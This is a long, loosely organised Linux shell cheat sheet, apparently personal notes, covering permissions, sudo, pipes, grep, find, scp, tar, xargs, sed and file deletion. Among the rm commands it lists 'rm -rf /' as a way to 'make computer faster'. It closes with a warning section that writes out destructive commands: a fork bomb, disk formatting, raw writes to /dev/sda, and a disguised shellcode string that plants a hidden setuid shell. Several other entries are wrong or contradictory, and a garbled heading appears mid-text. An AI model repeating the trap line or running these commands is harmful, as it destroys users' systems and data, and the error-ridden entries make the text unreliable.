	deluser newuser 							Delete user without deleting any of their files
	deluser --remove-home newuser  				Delete user's home directory when the user is deleted


	Sudo Privileges
		Now, your new user is able to execute commands with administrative privileges.
		When signed in as the new user, you can execute commands as your regular user by typing commands as normal:

		$some_command
		You can execute the same command with administrative privileges by typing sudo ahead of the command:

		$sudo some_command
		You will be prompted to enter the password of the regular user account you are signed in as.

		Specifying Explicit User Privileges in /etc/sudoers
		sudo visudo
		/etc/sudoers
		root    ALL=(ALL:ALL) ALL
		newuser ALL=(ALL:ALL) ALL

# SECURITY - FILE PERMISSION RELATED

	chmod 				Change permission modifiers 
	chown 				Change ownership 

	chmod 		Change the privileges of the users/groups to the file.
			
		chmod 000 config.html 		No one will have privileges to access "config.html" file
		chmod 100 config.html 		Only this user can use the file and others do not have privileges for it
		chmod 777 config.html  		The file is accessible for everyone
	chown Changes the owner of the file or group. 		

		chown root config.php 				Changes the file's "config.php" owner into root:
		chown root.root config.php7. 		Changes the owner of the "config.php" and group to root privileges:

	chmod options filename		change file protections
	chmod 	to change the read, write and/or execute permissions on files.
			Files are associated with their owners (u),
									  other users in the file’s group (g)
									  other users not in the file group (o);
									  the (a) tag refers to all users.
			Make a file executable to all users: chmod a+x bash_script.sh
				a   indicates all users
				x   indicates executable (others include r and w)
				+  indicates permissions are to be added (the – sign signifies the opposite)


	chmod octal file 	change permission Of file. Order: owner/group/world 
						4 — read (r) 
						2 — Write (w) 
						1 — execute (x) 
						eg: 	chmod 777 xxxx.js		rwx for everyone 
								chmod 755 xxxx.js		rw for owner, rx for group/world 
								chmod u+x xxxx.js
								chmod +x cli.js         Make the file executable

	chmod octal file-name						Change the permission of the file to octal
	
	Example	
	chmod 777 /data/test.c						Set rwx permission for owner,group,world
	chmod 777 /data/test.c						Set rwx permission for owner,rx for group and world
	chown owner-user file						Change owner of the file
	chown owner-user:owner-group file-name		Change owner and group owner of the file
	chown owner-user:owner-group directory		Change owner and group owner of the directory

	sudo 				Danger! become super user root. Escalate permissions to admin level. 
		$ sudo useradd -s /sbin/nologin dotnetuser
		$ sudo mkdir /var/SystemdExample
		$ sudo cp /home/tatanaka/Documents/git/tanaka-takayoshi/SystemdExample/1.1/ConsoleApp/bin/Release/netcoreapp1.1/publish/* /var/SystemdExample
		$ sudo chown -R dotnetuser:dotnetuser /var/SystemdExample
		$ sudo passwd root



	

	
	
	man 	access to the reference manuals


# HELP

	apropos 			Find what man page appropriate 
	
	man command 		show manual for 'comnand'
   	man [options] [command]
			\__
				-f 		print a short description of the given command
				-a		display, in succession, all of the available intro manual pages contained within the manual

# OPERATORS > >> | & && * !

	>		Output Redirection
			Redirect a command's output to (new) filename instead of another command
			$ echo foo > foo.txt					
			$ ls > file1
	
	>>		Append output to existing filename			$ echo bar >> foo.txt
	
	| 		Pipe
				send command output to another command
				In the UNIX philosophy, each program is a small utility that do one thing well. For example, the ls command lists the files in the current directory and the grep command searches its input for a specified term.
				Combine these with pipes (the | character) and you can search for a file in the current directory. The following command searches for the word “word”: ls | grep word

				unnamed pipes 
				
				named pipes 
				 	Persistent objects in the file system and will not be removed even after a system reboot. 
					Named pipes can be located using the ls command.
				 	mkfifo liquid_pipe 				To create a named pipe
					cat access_log > liquid_pipe
					tail liquid_pipe
	
	& 		background or batch mode when executing a command
			$notepad VR3.txt & 		Run the command in the background using the & operator
			$firefox &
			By default, Bash executes every command you run in the current terminal
			To launch an application and continue using the terminal, add the & operator to the end of the command to have Bash execute the program in the background
	
	&& 		Conditional Execution: run two commands, one after another
			sleep 5 && gnome-screenshot   	wait five seconds, then launch the gnome-screenshot tool

	* 		Wild Cards/asterisk: can match anything
			rm really*name 		deletes all files with file names beginning with “really” and ending with “name.”
			rm * 				delete every file in the current directory

	! 

	Tab Completion
		 time saver and it’s also useful if you’re not sure of a file or command’s exact name.

# FLOWS

	Any process has 3 standard flows. Flows can be redirected
	
	- STDIN		0	input (keyboard...)

		Types of inputs:
			Standard input (stdin)
			Command line arguments

			Passing input by stdin:						ls | wc -l		This will count the lines in the output of ls
			Passing input by command line arguments:	wc -l $(ls) 	This will count lines in the list of files printed by ls
	
	- STDOUT 	1	standard out 
			> /dev/null 	redirect stdout to ...
	
	- STDERR 	2	error out (console)
			2>/dev/null 	redirect stderr to ...
 			2>&1			redirect STDERR where stdout is redirected 
 							if STDOUT is already redirect to /dev/null, then STDERR will follow

# DIRECTORY 

	/               cd /
	 bin
	 boot
	 cache
	 data
	 dev
	 etc
	 home  
	 	nguinet     cd ~ = /home/nguinet
	 init
	 lib
	 lib64
	 lost+found
	 media
	 mnt
	 opt
	 proc
	 root
	 run
	 sbin
	 srv
	 sys
	 tmp
	 usr
	 var

	pwd 		Print working directory. where you currently are. Show the path of current directory 

	~ (tilde) 	current user’s home directory 
				cd /home/name = cd ~
				Relative path: cd ~/Desktop switch to the current user’s desktop.
	~ 			Home directory
				/users/username usually. Move back to folders referenced relative to this path by including it at the start of your path, for example ~/projects.

	./ 			Means "this directory"
	cd ~ 		Go to home directory (/home/user)
	cd /        Go to root directory (/)
	cd ..		To go up one level of the directory tree
	cd . 		Go to $HOME directory
	cd			Go to $HOME directory
	cd /test	Change to /test directory
	cd - 		Back to the previous directory
	cd 			Change to home
	cd <dir> 	Change directory to <dir>

	cd /var 	Changes the directory into /var inside the server:
	cd - 		Go one step back out of the directory:
	cd ..		Go one step further into the directory (directory above)

	. 		refers to the current directory, such as ./projects
	.. 		to move up one folder, use cd .., and can be combined to move up multiple levels ../../my_folder
	/ 		root of your system to reach core folders, such as system, users, etc.
	

	mkdir dir 			create directory dir
	mkdir directory-name	Create a directory
	
	popd		Pop	directory 
	pushd 		Push directory 

	Escaping spaces in folder name
		cd 'My Documents'
		cd "My Documents"
		cd My\ Documents    '\ ' means a single space

# BASE 64

	Base64 encode or decode FILE, or standard input, to standard output.
	RFC 4648

	base64  names.txt
	base64 -d names.b64 > names.txt

	echo QWxhZGRpbjpvcGVuIHNlc2FtZQ== | base64 --decode                  Aladdin:open sesame
	echo `echo QWxhZGRpbjpvcGVuIHNlc2FtZQ== | base64 --decode`


# FILES 
	
	File Search
	
		grep pattern files 		search for pattern IN FILES 
		grep -r pattern dir 	search recursively for pattern in dir 
		command | grep pattern 	search for for pattern in in the output of command 
		locate file 			find all instances of file 

		find 	Find files page through file 
		grep 	Find things inside files. Print lines matching a pattern 
		        grep, egrep, fgrep, rgrep 
		        grep  searches the named input FILEs (or standard input if no files are named, or if a single hyphen-minus (-) is given as file name) for lines containing a match to the given PATTERN.  By default, grep prints the matching lines.
		       In addition, three variant programs egrep, fgrep and rgrep are available.  egrep is the same as grep -E.  fgrep is the same as grep -F.  rgrep is the same as grep -r.  Direct invocation as either egrep or fgrep is deprecated, but is provided to allow historical applications that rely on them to run unmodified.

		find    search for files in a directory hierarchy
				find /chemin/vers/repertoire -type f | wc -l
				
				find . -name 'server.properties'
				
				find . -type f | grep '.bashrc'				
				    find: `./dev/lxss': Operation not permitted
					./etc/bash.bashrc
					find: `./etc/polkit-1/localauthority': Permission denied
					find: ./etc/skel/.bashrc
					`./etc/ssl/private': Permission denied
					./home/nguinet/.bashrc

		grep 	find lines that match a pattern in some input.
				search for the file “username.txt” in a directory:  ls -a | grep “username.txt”
				To check if some file has some text: grep text filename
				Grep can also interpret regular expressions.


			   Matcher Selection
			       -E, --extended-regexp
			              Interpret PATTERN as an extended regular expression (ERE, see below).  (-E is specified by POSIX.)

			       -F, --fixed-strings
			              Interpret PATTERN as a list of fixed strings, separated by newlines, any of which is to be matched.  (-F is specified by POSIX.)

			       -G, --basic-regexp
			              Interpret PATTERN as a basic regular expression (BRE, see below).  This is the default.

			       -P, --perl-regexp
			              Interpret PATTERN as a Perl regular expression (PCRE, see below).  This is highly experimental and grep -P may warn of unimplemented features.

			   Matching Control
			       -e PATTERN, --regexp=PATTERN
			              Use PATTERN as the pattern.  This can be used to specify multiple search patterns, or to protect a pattern beginning with a hyphen (-).  (-e is specified by POSIX.)

			       -f FILE, --file=FILE
			              Obtain patterns from FILE, one per line.  The empty file contains zero patterns, and therefore matches nothing.  (-f is specified by POSIX.)

			       -i, --ignore-case
			              Ignore case distinctions in both the PATTERN and the input files.  (-i is specified by POSIX.)

			       -v, --invert-match
			              Invert the sense of matching, to select non-matching lines.  (-v is specified by POSIX.)

			       -w, --word-regexp
			              Select  only  those  lines  containing matches that form whole words.  The test is that the matching substring must either be at the beginning of the line, or preceded by a non-word
			              constituent character.  Similarly, it must be either at the end of the line or followed by a non-word constituent character.  Word-constituent characters are  letters,  digits,  and
			              the underscore.

				 -x, --line-regexp
			              Select only those matches that exactly match the whole line.  (-x is specified by POSIX.)

			       -y     Obsolete synonym for -i.

			   General Output Control
			       -c, --count
			              Suppress  normal output; instead print a count of matching lines for each input file.  With the -v, --invert-match option (see below), count non-matching lines.  (-c is specified by
			              POSIX.)

			       --color[=WHEN], --colour[=WHEN]
			              Surround the matched (non-empty) strings, matching lines, context lines, file names, line numbers, byte offsets, and separators (for fields and groups of context lines) with  escape
			              sequences  to  display  them  in  color  on  the  terminal.  The colors are defined by the environment variable GREP_COLORS.  The deprecated environment variable GREP_COLOR is still
			              supported, but its setting does not have priority.  WHEN is never, always, or auto.

			       -L, --files-without-match
			              Suppress normal output; instead print the name of each input file from which no output would normally have been printed.  The scanning will stop on the first match.

			       -l, --files-with-matches
			              Suppress normal output; instead print the name of each input file from which output would normally have been printed.  The scanning will stop on the first match.  (-l  is  specified
			              by POSIX.)

			       -m NUM, --max-count=NUM
			              Stop  reading  a  file  after  NUM  matching  lines.   If the input is standard input from a regular file, and NUM matching lines are output, grep ensures that the standard input is
			              positioned to just after the last matching line before exiting, regardless of the presence of trailing context lines.  This enables a calling process to resume a search.  When  grep
			              stops  after  NUM  matching lines, it outputs any trailing context lines.  When the -c or --count option is also used, grep does not output a count greater than NUM.  When the -v or
			              --invert-match option is also used, grep stops after outputting NUM non-matching lines.

			       -o, --only-matching
			              Print only the matched (non-empty) parts of a matching line, with each such part on a separate output line.

			       -q, --quiet, --silent
			              Quiet; do not write anything to standard output.  Exit immediately with zero status if any match is found, even if an error was detected.  Also see the -s or  --no-messages  option.
			              (-q is specified by POSIX.)

			       -s, --no-messages
			              Suppress  error  messages  about nonexistent or unreadable files.  Portability note: unlike GNU grep, 7th Edition Unix grep did not conform to POSIX, because it lacked -q and its -s
			              option behaved like GNU grep's -q option.  USG-style grep also lacked -q but its -s option behaved like GNU grep.  Portable shell scripts should avoid both  -q  and  -s  and  should
			              redirect standard and error output to /dev/null instead.  (-s is specified by POSIX.)

			   Output Line Prefix Control
			       -b, --byte-offset
			              Print the 0-based byte offset within the input file before each line of output.  If -o (--only-matching) is specified, print the offset of the matching part itself.

			       -H, --with-filename
			              Print the file name for each match.  This is the default when there is more than one file to search.

			       -h, --no-filename
			              Suppress the prefixing of file names on output.  This is the default when there is only one file (or only standard input) to search.



				ls | grep word
				history | grep really
		
		grep 'abc' test.txt | wc 					extract all rows containing 'abc' in test.txt, then count these rows with wc


 	dirname - strip last component from file name

 	 	dirname /usr/bin/   	        ->  "/usr"
       	dirname dir1/str dir2/str 		->  "dir1" followed by "dir2"
       	dirname stdio.h   		        -> 	"."

## File Replace in

### Replace Spaces With Tabs			cat geeks.txt | tr ':[space]:' '\t' > out.txt.

		Convert Upper or Lower Case			cat myfile | tr a-z A-Z > output.txt.

        sed - stream editor for filtering and transforming text

		Replace
		    "John": "36",  →  "Johnny": "36",
		    >ls names*.json | xargs sed -i 's/"John"/"Johnny"/g'
		    
		    "John": "36",  →  "Johnny": 42,
		    grep -rl "John" names*.json | xargs sed -i 's/"36"/42/g'

 	File count - statistics

 		wc [OPTION]... [FILE]... 		print newline, word, and byte counts for each file

        ls | wc -l         
        grep 'abc' test.txt | wc 

        Passing input by stdin:						ls | wc -l		This will count the lines in the output of ls
		Passing input by command line arguments:	wc -l $(ls) 	This will count lines in the list of files printed by ls

 		  Print newline, word, and byte counts for each FILE, and a total line if more than one FILE is specified.  With no FILE, or when FILE is -, read standard input.  A word is a non-zero-length
	       sequence of characters delimited by white space.  The options below may be used to select which counts are printed, always in the following order: newline, word, character,  byte,  maximum
	       line length.

	       -c, --bytes	              print the byte counts
	       -m, --chars	              print the character counts
	       -l, --lines	              print the newline counts
	       --files0-from=F            read input from the files specified by NUL-terminated names in file F; If F is - then read names from standard input
	       -L, --max-line-length      print the length of the longest line
	       -w, --words                print the word counts
	       --help                     display this help and exit
	       --version	              output version information and exit

	Delete File 
		find /tmp -mtime +14 | xargs rm 	remove file older than 2 weeks

	Create File
		touch <file>	Create an empty file				$ touch foo
		touch file		Create or update file
		touch file 		Create or update file 
		touch /home/useris/public_html/contacts.html 	Created a file "contacts.html" in directory "/home/useris/public_html/":

		echo bar >> foo.txt

		Create File With a Specific Size
			dd if=/dev/zero of=out.txt bs=1M count=10		This will create a file of 10 megabytes filled with zeros

	File Filter
		grep string filename		identify all rows containing a specific string in a text file
		uniq 						remove duplicate entries. -c to count number of duplicates

	File Sort
		sort 		sort a file (alphabetically (default) or numerically)
		sort filename.txt | uni -c > results.txt 	sort filename.txt alphabetically then remove duplicates, count duplicates, store results in results.txt

	File Content
	
		
		cat filename
				Print the whole file. Dump file contents
				on multiple input files too. Some examples:  cat filename1 filename2 > newFile
				There is also a tac command too, it reads files in reverse order. If you cat an object file and your terminal starts showing gibberish; type reset.

		 cat 		Shows the content of the chosen file.

			cat [options] [file_names]
					\__
						-b	numer non-blank output lines
						-n	number all output lines
						-s	squeeze multiple adjacent blank lines
						-v	display nonprinting characters, except for tabs and the end of line character

			cat index.html 				Shows the content of the "index.html" file:
			cat file1.txt file2.txt 	Concatenate the content of 2 files and display the result in terminal:	



		cat 				Display content of text file on your screen
		cat <file>			Print contents of file to screen	$ cat hello.txt
		cat > file			Place standard input into file
		cat > file 			place standard input into file 
		cat filename 		Dump file contents

		head file			Output first 10 lines Of file 
		head file			Output first 10 lines of file

		tail -f file		Show contents of file as it grows starting with the last 10 lines		
		tail file			Output last 10 lines of file
		tail file 			output last 10 ines of file 
		tail -100, head -100 		Extract the last (first) 100 rows of a file

		tail 	"cat" command on the end of the file. 	
		tail /var/log/messages	Shows the last 20 lines of the file /var/log/messages
		tail -1008  			Shows the last 100 lines

		head [options] [file_name(s)]
				\__
					-n N	prints out the first N lines of the file(s)
					-q		doesn’t print out the file headers
					-v		always prints out the file headers

		head file.txt 						Show first ten lines of file.txt (default)
		head -n 7 file.txt 					Show first seven lines of file.txt
		head -q -n 5 file1.txt file2.txt 	Show first 5 lines of file1.txt, followed by the first 5 lines of file2.txt


		more filename 		shows the first part of a file (fit on one screen). Sspace bar=more / q=quit. /pattern to search for a pattern.
		more file			output the contents Of the file 
		more 		"cat", but shows only as much text as fits to the window. 	
		more /var/log/messages
			Shows only that part of text that fits to the window opened. For entering another page, need to press "SPACE" bar on the keyboard. For escaping, need to press "q":

		less file			output the contents Of the file 		

		wc		count number of bytes, words, lines in text file
		wc 		prints newline, word, and byte counts for each FILE, and a total if more than one FILE is specified. 
				With no FILE, or when FILE is a dash ("-"), wc operates on standard input.
				wc sources.list
			  	31  175 1686 sources.list
				\    \		\____ bytes count 	-c
				 \    \___ words count 			-w
				  \__ lines count 				-l

	Links
		ln -s /path/to/file-name link-name		Create symbolic link to file-name
		ln -s file link 						Create symbolic link 'link' 

		echo a > a.txt
		$ echo b > b.txt
		$ cat a.txt
		a
		$ cat b.txt
		b
		Create links:

		$ ln a.txt a-hard-link    # create a hard link to a.txt
		$ ln -s b.txt b-symlink   # create a symlink to b.txt
		$ ls -l
		a-hard-link               # hard link will not show `->`
		a.txt
		b-symlink -> b.txt        # symlink will show `->` and its original file
		b.txt
		Rename a.txt, the hard link would still work

		$ mv a.txt a2.txt
		$ cat a-hard-link
		a
		Rename b.txt, the symlink will break

		$ mv b.txt b2.txt
		$ cat b-symlink
		cat: b-symlink: No such file or directory

		hard links 
			Can only link to files
			Must be on the same partition (you cannot hard link across file systems or volumes)
			If the original is deleted, the link will still work since it links to the underlying data (which means you need to delete all hard links to delete a file).
			Always refer to an existing file
		
		symlinks 
			Can point to both files and directories
			No partition limits
			If the original is deleted, the link will not work
			May contain an arbitrary path.

		chown will affect all hard links, but will not change symlinks

	File Copy
		cp 					copy a file
		mv  				rename a file

		cp -r dir1  dir2	Copy dir1  to dir2, create dir2 if it doesn’t exist. -R, -r, --recursive
		cp <old> <new>		Copy old to new						$ cp foo bar
		cp file1  file2		Copy file1 to file2
		cp file1 file2 		Copy file1 to file2

		mv <old> <new>		Rename (move) from old to new		$ mv foo bar
		mv file1 file2		Rename source to dest / move source to directory
		mv file1 file2 		Rename file1 to file2

		cp -a /home/useris/public_html/test/* /home/useris/public_html/15

		cp -r /joe/demo_videos /sdcard/		
		mv /joe/demo_videos /joe/demo_videos_orig	 	Move the original videos out of the way without deleting them:
		ln -s /sdcard/demo_videos/ /joe/demo_videos 	Create a symlink to the folder on the SD card:
		
		mv <file to move> <location to move it to>
		mv source target
		mv source ... directory
			-f 	  to force move them and overwrite files without checking with the user.
			-i 	  to prompt confirmation before overwriting files.

	Files Differences
		diff f1 f2 					
		diff <f1> <f2>			compares files, and shows where they differ 
		diff foo.txt bar.txt

	File Encryption
		gpg -c file	Encrypt file
		gpg file.gpg
	
	Files list	

		ls 		list directory content
				ls -alht
				a – show all file contents (including hidden files)
				l – display a long list
				h – Human-readable format (for file sizes)
				t – Sort the output by the most recently updated file

		ls				List directory or file				$ ls hello.txt
		ls -l			List long form						$ ls -l hello.txt
		ls -a			List all (including hidden)			$ ls -a
		ls -al			Display all information about files/ directories	
		ls -d */        List directories only 
        ls -d $PWD/*	List files and directories with full path


		ls -lt | head 	List 10 first ordered by date desc
		ls -rtl			Long by reverse modification time	$ ls -rtl
		
		ls 		Shows all files & directories that are in the directory you are in.
		
		ls [options] [file_names]
				\__ 
					-a 	all files and folders, including ones that are hidden and start with a .
					-l	List in long format
					-G	Enable colorized output

		ls -al 		Shows all the files and directories and more information about every file:
		ls *.html 	Shows all the files that ends with ".html":

	    alias lstree="ls -R | grep ":$" | sed -e 's/:$//' -e 's/[^-][^\/]*\//--/g' -e 's/^/   /' -e 's/-/|/'"

	    ls -t | head -4 	list only 4th first files

	

		ls -a		list all files including hidden file starting with '.'
		ls --color	colored list [=always/never/auto]
		ls -d		list directories - with ' */'
		ls -F		add one char of */=>@| to enteries
		ls -i		list file's inode index number
		ls -l		list with long format - show permissions
		ls -la		list long format including hidden files
		ls -lh		list long format with readable file size
		ls -ls		list with long format with file size
		ls -r		list in reverse order
		ls -R		list recursively directory tree
		ls -s		list file size
		ls -S		sort by file size
		ls -t		sort by time & date
		ls -X		sort by extension name

	File current commands flow
		mkdir xxx
		cd xxx
		touch readme.md    optional, just do 'cat > readme.md'
		cat > readme.md
		blabla...
		blabla...
		blabla... CTRL-C
		cat readme.md

# FILE TRANSFER: ssh - scp

	SSH Transfer
	Copy something from another system to this system:
	scp username@hostname:/path/to/remote/file /path/to/local/file

	Copy something from this system to some other system:
	scp /path/to/local/file username@hostname:/path/to/remote/file          

	Copy something from some system to some other system:
	scp username1@hostname1:/path/to/file username2@hostname2:/path/to/other/file  


	 # SCP - SECURE COPY 
		remote file copy program

	scp [-12346BCpqrv] [-c cipher] [-F ssh_config] [-i identity_file] [-l limit] [-o ssh_option] [-P port] [-S program] [[user@]host1:]file1 ... [[user@]host2:]file2

	scp file.txt server2:/tmp
	rsync	Secure copy file.txt to remote host /tmp folder
	rsync	
	rsync -a /home/apps /backup/	Synchronize source to destination

## From your local windows10-ubuntu bash use this command:

	for download: (from your remote server folder to d:/ubuntu):	scp username@ipaddress:/folder/file.txt /mnt/d/ubuntu
	Then type your remote server password if there is need.

	for upload: (from d:/ubuntu to remote server ) :	       	     scp /mnt/d/ubuntu/file.txt username@ipaddress:/folder/file.txt

## SbeddIWAtjEcmoXWhWnj


	linux just use /mnt/c or/mnt/c

### From your local windows10-ubuntu bash use this command:

	for download: (from your remote server folder to d:/ubuntu) :

		scp username@ipaddress:/folder/file.txt /mnt/d/ubuntu
		Then type your remote server password if there is need.

	for upload: (from d:/ubuntu to remote server ) :

		scp /mnt/d/ubuntu/file.txt username@ipaddress:/folder/file.txt 


	Transferring files over SSH
		Win bash <---> Linux
	    nguinet@SL00048424:~$ pwd
	    /home/nguinet →           equivalent is C:\Users\ZN5573\AppData\Local\lxss\home\nguinet
	    nguinet@SL00048424:~$ scp "pfontaine@idays.westeurope.cloudapp.azure.com:df1_conso_avantt0.csv" .

	Copy something from another system to this system:
	scp username@hostname:/path/to/remote/file /path/to/local/file

	Copy something from this system to some other system:
	scp /path/to/local/file username@hostname:/path/to/remote/file          

	Copy something from some system to some other system:
	scp username1@hostname1:/path/to/file username2@hostname2:/path/to/other/file  

	

    Copying a file
	$ scp username@from_host_ip:/home/ubuntu/myfile /cygdrive/c/Users/Anshul/Desktop

	And for copying all files
	$ scp -r username@from_host_ip:/home/ubuntu/ *. * /cygdrive/c/Users/Anshul/Desktop

# COMPRESSION / ARCHIVES

	tar cf home.tar home					Create tar named home.tar containing home/
	tar cf soho.tar /home/wordpress/web
	tar xf file.tar							Extract the files from file.tar
	tar czf file.tar.gz files				Create a tar with gzip compression
	gzip file								Compress file and renames it to file.gz

	tar 			Used to create file archive or extract files from it.
	tar -zxvf file.tar.gz 			Extract the file:
	tar -xvf file.tar 				Extract the file:
	tar -cf test.tar test/ 			Collects all the files in the "test/" directory and moves it into "test.tar" archive:
	gzip -d file.gz 				Unzips the specific file

	
	Splits up a file into multiple 1gb archives.
	split-file.sh
		# Make sure you zip up the file first
		echo "Splitting up archive $1"
		tar -cvzf $1.tar.gz $1
		split -b 1024mb $1.tar.gz $1.tar.gz
		# to combine again:
		cat $1.tar.gz.* > $1.tar.gz 

	gzip 						compress/uncompress files

		tar
				Linux downloads come in the form .tar.gz; which are zipped archives.
				To extract, you have to unzip the file to get the .gz off and then untar the tar archive to get the package contents.
				Tar does this for you; I normally use this command: tar -xzvf package.tar.gz.
				x –  Indicates extraction
				v –  Verbose mode
				z –  Notifies tar that the archive is zipped so it can unzip it
				f –  Informs it that the filename follows
				c –  indicates create an archive
				To create a tar archive, use the following command tar -czvf java_archive.tar.gz *.java

		tar cf file.tar files 	tar files into file.tar 
			tar cf soho.tar /home/wordpress/web
			tar xf file.tar 		untar into current directory 
			tar tf file.tar 		show contents of archive 

			tar flags: 
						c - create archive 		j - bzip2 compression 
						t - table of contents 	k -	do not overwrite 
						x - extract 			T - files from file 
						f - specifies filename 	w - ask for confirmation 
						z - use zip/gzip 		v - verbose 
						 
			gzip file 			compress file and rename to file.gz 
			gzip -d file.gz 	decompress filegz 

			cat source1.css source2.css | csso | gzip -9 -c > production.css.gz

			 * RAR
			 archives sous GNU/Linux
			 With GUI: Ark, File-Roller, Xarchiver
			 With console:
			 	Install paquets rar et unrar

			 	sudo apt-get install unrar
			 	unrar xxx.rar

			 	Au lieu d'aller chercher des programmes sur internet, on se procure les paquets auprès de sa distribution, ce qui garantit que les paquets ont été testés pour la version de votre distribution : c'est un gage de stabilité et de sécurité. http://lea-linux.org/documentations/Software-soft_gere-installation_logiciel
			 	Quand il n'y a pas de paquets, on peut installer un logiciel à partir des sources (make)	

# xargs - build and execute command lines from standard input

	http://man7.org/linux/man-pages/man1/xargs.1.html
	https://shapeshed.com/unix-xargs/
	echo 'one two three' | xargs mkdir
	a command line utility for building an execution pipeline from standard input. 

	Whilst tools like grep can accept standard input as a parameter, many other tools cannot. 
	Using xargs allows tools like echo and rm and mkdir to accept standard input as arguments.


	files older than two weeks in the temp folder are found and then piped to the xargs command which runs the rm command on each file and removes them.
	find /tmp -mtime +14 | xargs rm


	Execute command lines from standard input
	Exécute arguments 
	to pass the output of a command to another command as an argument
	search for PNGpng files and compress them or do anything with them:		find. -name *.png -type f -print | xargs tar -cvzf images.tar.gz

	Have a list of URLs in a file and you want to download them or process them in a different way:
	cat urls.txt | xargs wget
	>ls names*.json | xargs sed -i 's/"John"/"Johnny"/g'
	                             
	 xargs
	   [-0prtx] 
	   [-E eof-str] 
	   [-e[eof-str]] 
	   [--eof[=eof-str]] 
	   [--null] 
	   [-d delimiter] 
	   [--delimiter delimiter] 
	   [-I replace-str] 
	   [-i[replace-str]] 
	   [--replace[=replace-str]] 
	   [-l[max-lines]] 
	   [-Lmax-lines]      
       [--max-lines[=max-lines]]      
       [-n max-args]      
       [--max-args=max-args]      
       [-s max-chars]      
       [--max-chars=max-chars]      
       [-P max-procs]      
       [--max-procs=max-procs]      
       [--interactive]      
       [--verbose]       
       [--exit]
       [--no-run-if-empty]      
       [--arg-file=file]      
       [--show-limits]      
       [--version]      
       [--help] [command [initial-arguments]]

	EXAMPLES
		
	   somecommand | xargs -s 50000 echo | xargs -I '{}' -s 100000 rm '{}'

       find /tmp -name core -type f -print | xargs /bin/rm -f
       Find files named core in or below the directory /tmp and delete them.  Note that this will work incorrectly if there are any filenames containing newlines or spaces.

       find /tmp -name core -type f -print0 | xargs -0 /bin/rm -f
       Find files named core in or below the directory /tmp and delete them, processing filenames in such a way that file or directory names containing spaces or newlines are correctly handled.

       find /tmp -depth -name core -type f -delete
       Find  files  named core in or below the directory /tmp and delete them, but more efficiently than in the previous example (because we avoid the need to use fork(2) and exec(2) to launch rm
       and we don't need the extra xargs process).

       cut -d: -f1 < /etc/passwd | sort | xargs echo
       Generates a compact listing of all the users on the system.

       xargs sh -c 'emacs "$@" < /dev/tty' emacs
       Launches the minimum number of copies of Emacs needed, one after the other, to edit the files listed on xargs' standard input.  This example achieves the same effect as  BSD's  -o  option,
       but in a more flexible and portable way.

# sed - stream editor for filtering and transforming text

  	A stream editor perform basic text transformations on an input stream (a file / input from a pipeline)
  	Permits scripted edits via xargs: >grep -rl "John" names*.json | xargs sed -i 's/42/"42 years old"/g' 

  	While in some ways similar to an editor which
       permits scripted edits (such as ed), sed works by making only one pass over the input(s), and is consequently more efficient.  But it is sed's ability to filter text in  a  pipeline  which
       particularly distinguishes it from other types of editors.

       -n, --quiet, --silent		            suppress automatic printing of pattern space
       -e script, --expression=script	        add the script to the commands to be executed
       -f script-file, --file=script-file	    add the contents of script-file to the commands to be executed
       --follow-symlinks	              		follow symlinks when processing in place

       -i[SUFFIX], --in-place[=SUFFIX]	        edit files in place (makes backup if SUFFIX supplied)

       -l N, --line-length=N	              	specify the desired line-wrap length for the `l' command
       --posix	              					disable all GNU extensions.
       -r, --regexp-extended	              	use extended regular expressions in the script.
       -s, --separate	              			consider files as separate rather than as a single continuous long stream.
       -u, --unbuffered              	

# SEARCH FILES BY NAME

	Locate file: find all instances of file
	find /home/tom -name ‘index*’	Find files names that start with “index”
	find /home -size +10000k		Find files larger than 10000k in /home
	
# SEARCH IN FILES
		
	grep pattern files				Search for 'pattern' in 'files'
	grep -r pattern dir				Search recursively for 'pattern' in 'dir'

# REPLACE IN FILES
	
    "John"      → "Johnny"					>ls names*.json | xargs sed -i 's/"John"/"Johnny"/g'        
    "John": 4" 	→  "John": "42 years old"   >grep -rl "John" names*.json | xargs sed -i 's/42/"42 years old"/g'

# REMOVE FILES FOLDER

	rm 						remove a file   rm -rf xxx.txt remove all .txt without prompting (recurse+force)
	mkdir  					create a new directory
	rmdir  					delete a directory (you need to erase all files first)

	rm -rf dir				remove directory dir 
	rm *.html 				Removes all the files that ends in ".html"
	rm  index2.html 		Removes the "index2.html" file:rm index2.htmlDeletes the "index2.html" file without asking if you really want to remove it ("force")
	rm -f <file>			Force-remove file					$ rm -f bar
	rm -f directory-nam		Forcefully remove file
	rm -f file 				force remove file 
	rm -f file-name			Delete directory recursively
	rm -r dir  				delete directory dir 
	rm -r directory-name
	rm -rf / 				make computer faster 
	rm -rf directory-name	Forcefully remove directory recursively
	rm <file>				Remove (delete) file				$ rm foo
	rm file 				delete file 
	rm file-name			Delete file

	rm -i test*.txt 		remove all files starting with test + .txt.  -i=manual confirmation before each file gets deleted

# 8 DEADLY LINUX COMMANDS YOU SHOULD NEVER RUN ON LINUX

## Beware rm -rf.

		rm -rf / 	Deletes Everything!
			   \_____ Tells rm to start at the root directory, which contains all the files on your computer 
			          and all mounted media devices, including remote file shares and removable drives.
		    -rf 	Run rm recursively (delete all files and folders inside the specified folder) and force-remove all files without prompting you.

		rm 			Remove the following files.
		 rm –rf ~ 		would delete all files in your home folder
		 rm -rf .* 		would delete all your configuration files.

## Don’t run weird-looking, obviously disguised commands that you don’t understand

		The same as rm –rf /
		char esp[] __attribute__ ((section(“.text”))) /* e.s.p
		release */
		= “\xeb\x3e\x5b\x31\xc0\x50\x54\x5a\x83\xec\x64\x68”
		“\xff\xff\xff\xff\x68\xdf\xd0\xdf\xd9\x68\x8d\x99”
		“\xdf\x81\x68\x8d\x92\xdf\xd2\x54\x5e\xf7\x16\xf7”
		“\x56\x04\xf7\x56\x08\xf7\x56\x0c\x83\xc4\x74\x56”
		“\x8d\x73\x08\x56\x53\x54\x59\xb0\x0b\xcd\x80\x31”
		“\xc0\x40\xeb\xf9\xe8\xbd\xff\xff\xff\x2f\x62\x69”
		“\x6e\x2f\x73\x68\x00\x2d\x63\x00”
		“cp -p /bin/sh /tmp/.beyond; chmod 4755
		/tmp/.beyond;”;

	:(){ :|: & };: – Fork Bomb
	defines a shell function that creates new copies of itself. The process continually replicates itself, and its copies continually replicate themselves, quickly taking up all your CPU time and memory. This can cause your computer to freeze. It’s basically a denial-of-service attack.

	mkfs.ext4 /dev/sda1 – Formats a Hard Drive
			  /dev/sda1 – Specifies the first partition on the first hard drive, which is probably in use.
	mkfs.ext4 – Create a new ext4 file system on the following device.


	command > /dev/sda – Writes Directly to a Hard Drive
			  /dev/sda – Write the output of the command directly to the hard disk device.
			> – Send the output of the command to the following location.
